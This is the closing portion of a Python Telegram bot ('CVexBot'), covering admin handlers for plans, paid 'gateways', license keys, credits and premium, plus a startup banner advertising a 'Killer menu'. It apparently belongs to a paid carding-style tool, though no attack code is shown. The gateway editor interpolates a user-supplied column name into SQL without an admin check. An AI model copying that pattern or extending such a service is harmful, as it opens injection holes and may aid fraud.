    elif state == 'admin_addplan_credits':
        user_states[uid] = {'state':'admin_addplan_price','name':st['name'],'credits':message.text}
        safe_reply(message, "Enter Price:")
    elif state == 'admin_addplan_price':
        user_states[uid] = {'state':'admin_addplan_days','name':st['name'],'credits':st['credits'],'price':message.text}
        safe_reply(message, "Enter Days:")
    elif state == 'admin_addplan_days':
        c = get_db().cursor()
        c.execute("INSERT OR REPLACE INTO plans (name, credits, price, days, original_price, custom) VALUES (?, ?, ?, ?, '', 0)", (st['name'], st['credits'], st['price'], message.text))
        get_db().commit()
        del user_states[uid]
        safe_reply(message, f"{E_CHECK} Plan added!", reply_markup=get_admin_markup())

    elif state == 'admin_editgw_cmd':
        user_states[uid] = {'state':'admin_editgw_field','cmd':message.text.lower()}
        safe_reply(message, "Enter field (name/price/cost/status/type/format):")
    elif state == 'admin_editgw_field':
        user_states[uid] = {'state':'admin_editgw_val','cmd':st['cmd'],'field':message.text.lower()}
        safe_reply(message, "Enter new value:")
    elif state == 'admin_editgw_val':
        fld = st['field']; val = message.text
        if fld == 'cost':
            try: val = int(val)
            except: return safe_reply(message, "Must be number.")
        c = get_db().cursor(); c.execute(f"UPDATE gateways SET {fld}=? WHERE cmd=?", (val, st['cmd'])); get_db().commit()
        del user_states[uid]
        safe_reply(message, f"{E_CHECK} Updated.", reply_markup=get_admin_markup())

    elif state == 'admin_genkey_days' and is_admin(uid):
        user_states[uid] = {'state':'admin_genkey_qty','days':message.text}
        safe_reply(message, "Enter Quantity:")
    elif state == 'admin_genkey_qty' and is_admin(uid):
        try:
            days = int(st['days']); qty = int(message.text)
            keys = []; c = get_db().cursor()
            for _ in range(qty):
                k = secrets.token_hex(16)[:31].upper()
                c.execute("INSERT INTO licenses (key, days) VALUES (?, ?)", (k, days))
                keys.append(k)
            get_db().commit(); del user_states[uid]
            safe_reply(message, f"{E_CHECK} Generated:\n\n" + "\n".join([f"<code>{k}</code>" for k in keys]), parse_mode='HTML', reply_markup=get_admin_markup())
        except: safe_reply(message, "Invalid.")

    elif state == 'admin_addcr_target' and is_admin(uid):
        target_u = resolve_user_target(message.text)
        if not target_u:
            return safe_reply(message, f"{E_CROSS} User not found: <code>{message.text}</code>\nTry again or /cmds.", parse_mode='HTML')
        user_states[uid] = {'state':'admin_addcr_amt','target_id':target_u[0]}
        safe_reply(message, f"{E_CHECK} User: <code>{target_u[0]}</code> (@{target_u[1] or 'nouser'})\nCredits: <b>{target_u[2]}</b>\n\nEnter Amount:", parse_mode='HTML')
    elif state == 'admin_addcr_amt' and is_admin(uid):
        try:
            amt = int(message.text.strip())
            if amt == 0 or abs(amt) > 1000000: raise ValueError
        except:
            del user_states[uid]; return safe_reply(message, f"{E_CROSS} Invalid amount.", parse_mode='HTML', reply_markup=get_admin_markup())
        try:
            tgt = st['target_id']; u = get_user(tgt)
            if not u: del user_states[uid]; return safe_reply(message, f"{E_CROSS} User disappeared.", parse_mode='HTML', reply_markup=get_admin_markup())
            update_credits(tgt, amt); del user_states[uid]
            safe_reply(message, f"{E_CHECK} <b>Done!</b>\nAdded <b>{amt:+d}</b> to <code>{tgt}</code>\nNew: <b>{u[2] + amt}</b>", parse_mode='HTML', reply_markup=get_admin_markup())
            send_credit_notification(tgt, amt)
        except Exception as e:
            del user_states[uid]
            safe_reply(message, f"{E_CROSS} Error: {type(e).__name__}", parse_mode='HTML', reply_markup=get_admin_markup())

    elif state == 'admin_addprem_target' and is_admin(uid):
        target_u = resolve_user_target(message.text)
        if not target_u:
            return safe_reply(message, f"{E_CROSS} User not found.", parse_mode='HTML')
        user_states[uid] = {'state':'admin_addprem_days','target_id':target_u[0]}
        cur = f"{E_CHECK} Active ({target_u[5]})" if target_u[3] == 1 else f"{E_CROSS} Free"
        safe_reply(message, f"{E_CHECK} User: <code>{target_u[0]}</code>\nPremium: {cur}\n\nEnter Days:", parse_mode='HTML')
    elif state == 'admin_addprem_days' and is_admin(uid):
        try:
            d = int(message.text.strip())
            if d <= 0 or d > 3650: raise ValueError
        except:
            del user_states[uid]; return safe_reply(message, f"{E_CROSS} Invalid days (1-3650).", parse_mode='HTML', reply_markup=get_admin_markup())
        try:
            tgt = st['target_id']; u = get_user(tgt)
            if not u: del user_states[uid]; return safe_reply(message, f"{E_CROSS} User disappeared.", parse_mode='HTML', reply_markup=get_admin_markup())
            exp = (datetime.now() + timedelta(days=d)).strftime("%Y-%m-%d %H:%M:%S")
            update_status(tgt, 'is_premium', 1); update_status(tgt, 'expiry_date', exp)
            del user_states[uid]
            safe_reply(message, f"{E_CHECK} <b>Premium Activated!</b>\nUser: <code>{tgt}</code>\nDuration: <b>{d}d</b>\nExpires: <b>{exp}</b>", parse_mode='HTML', reply_markup=get_admin_markup())
            send_premium_notification(tgt, d, exp)
        except Exception as e:
            del user_states[uid]
            safe_reply(message, f"{E_CROSS} Error: {type(e).__name__}", parse_mode='HTML', reply_markup=get_admin_markup())

# ==========================================
# STARTUP
# ==========================================
print("=" * 60)
print("✅ CVexBot — ALL-IN-ONE FINAL v2")
print("=" * 60)

try:
    bot.remove_webhook(); print("   ✓ Webhook cleared")
except Exception as e: print(f"   ✗ Webhook: {e}")

try:
    me = bot.get_me()
    print(f"   ✓ Bot: @{me.username}")
except Exception as e:
    print(f"   ✗ TOKEN INVALID: {e}"); sys.exit(1)

ensure_owner_in_db()

print("   ✓ Crash-guard on ALL handlers")
print("   ✓ Users table auto-migrated (refer_code at pos 7)")
print("   ✓ BeautifulSoup analyzer")
print("   ✓ Premium sticker notifications")
print("   ✓ Retry on ERROR")
print("   ✓ Killer header with price")
print("   ✓ Killer menu VISIBLE for all (locked for non-premium)")
print("   ✓ NEW PLANS: SHADOW, PHANTOM, REAPER, GODMODE")
print("   ✓ /genplan command + plan link redemption")
print("   ✓ Premium required = CVEX style message")
print("=" * 60)
print()

while True:
    try:
        bot.infinity_polling(timeout=15, long_polling_timeout=10)
    except Exception as e:
        print(f"⚠ Polling: {type(e).__name__}: {str(e)[:200]}")
        print("   Restarting in 5s...")
        time.sleep(5)
